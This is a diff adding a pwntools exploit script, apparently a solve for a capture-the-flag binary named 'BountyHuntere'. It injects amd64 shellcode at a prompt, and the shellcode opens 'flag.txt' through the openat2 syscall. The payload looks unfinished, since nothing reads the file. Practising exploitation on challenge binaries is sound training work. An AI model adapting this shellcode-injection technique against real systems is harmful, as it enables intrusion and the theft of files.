@@ -1,0 +1,49 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./BountyHuntere")
+# context.log_level='debug'
+# p = remote("addr", 1337)
+p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+gdbs()
+shellcode = asm("""
+                mov rax,0x1b5
+                sub rbx,176
+                mov rdi,-100
+                xor rdx,rdx
+                mov rsi,8392585648256674918
+                push rdx
+                push rsi
+                mov rsi,rsp
+                mov rdx,rbx
+                mov r10,24
+                syscall
+                mov rax, 0
+
+                """,arch="amd64")
+
+
+sla(">>",shellcode)
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
